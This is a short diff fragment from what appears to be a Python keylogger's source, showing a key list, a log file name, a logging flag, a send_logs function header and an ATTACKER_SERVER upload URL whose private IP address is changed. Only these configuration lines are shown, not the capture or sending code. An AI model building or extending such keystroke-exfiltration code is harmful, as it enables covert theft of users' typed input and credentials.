@@ -26,9 +26,7 @@ key_list = []
 x = False
 log_file = 'logs.json'
 START_LOGGING = False
-
-
-ATTACKER_SERVER = 'http://192.168.1.71:5000/upload'
+ATTACKER_SERVER = 'http://192.168.1.67:5000/upload'
 
 
 def send_logs():
